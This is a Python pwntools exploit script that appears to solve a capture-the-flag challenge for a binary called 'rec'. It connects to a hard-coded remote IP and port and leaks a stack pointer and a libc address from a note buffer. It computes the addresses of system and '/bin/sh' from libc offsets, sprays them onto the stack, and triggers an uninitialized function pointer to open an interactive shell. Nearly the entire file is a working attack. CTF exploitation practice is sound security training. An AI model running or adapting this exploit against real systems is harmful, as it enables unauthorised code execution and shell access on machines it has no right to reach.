from pwn import *

"""
Stack Frame
===========
menu    0
    buf[2]   e

    take_note   30
        note[20]    50 <- leak

    polish  20
        op          4c
        sum         48
        get_arg     44
        op2         40
        operator[2] 3a
        operand[12] 38

    sign    20
        print_sign  360
            print_fun   380 <- vulnerable
            op          37c
            operand[12] 378

"""

# take_note = menu ebp leak


def select_menu(num):
    p.recvuntil('> ')
    p.sendline(str(num))


def take_note(payload):
    select_menu(0)
    p.recvuntil(': ')
    p.send(payload)


def read_note():
    select_menu(1)
    p.recvuntil(': ')
    return p.recvline()[:-1]


def sign(num):
    select_menu(5)
    p.sendline(str(num))


def itoa(num):
    num = num & 0xFFFFFFFF
    if num & 0x80000000:
        num = -0x100000000 + num
    return str(num)

# p = process('./rec')
p = remote('78.46.224.74', 4127)

leak_note = read_note()
menu_ebp = u32(leak_note[0:4])
text_6fb = u32(leak_note[4:8])
addr_IO_2_1_stdout_ = u32(leak_note[8:12])

log.success('menu_ebp: {:#x} / text_6fb: {:#x} / _IO_2_1_stdout_: {:#x}'.format(
    menu_ebp, text_6fb, addr_IO_2_1_stdout_
))

'''
Using libc-database

./find _IO_2_1_stdout_ d60 | awk '{print substr($3, 1, length($3)-1)}' | while read LINE
do
    ./dump "$LINE" _IO_2_1_stdout_ system str_bin_sh
done

Local
=====
offset__IO_2_1_stdout_ = 0x001b2d60
offset_system = 0x0003ada0
offset_str_bin_sh = 0x15b82b

Remote
======
offset__IO_2_1_stdout_ = 0x001b3d60
offset_system = 0x0003a8b0
offset_str_bin_sh = 0x15cbcf
'''

offset__IO_2_1_stdout_ = 0x001b3d60
offset_system = 0x0003a8b0
offset_str_bin_sh = 0x15cbcf

system_addr = addr_IO_2_1_stdout_ - offset__IO_2_1_stdout_ + offset_system
binsh_addr = addr_IO_2_1_stdout_ - offset__IO_2_1_stdout_ + offset_str_bin_sh

# paint stack
select_menu(2)
p.recvuntil('Operator: ')
p.sendline('S')

s = log.progress('Working...')
for i in range(110):
    p.recvuntil('Operand: ')
    if i == 0x63:
        p.sendline(itoa(system_addr))
    elif i == 0x64:
        p.sendline(itoa(binsh_addr))
    else:
        p.sendline(str(i))
    s.status('{}/110'.format(i+1))
s.success('OK!')

p.recvuntil('Operand: ')
p.sendline('.')

# uninitialized function pointer
sign(0)

p.interactive()
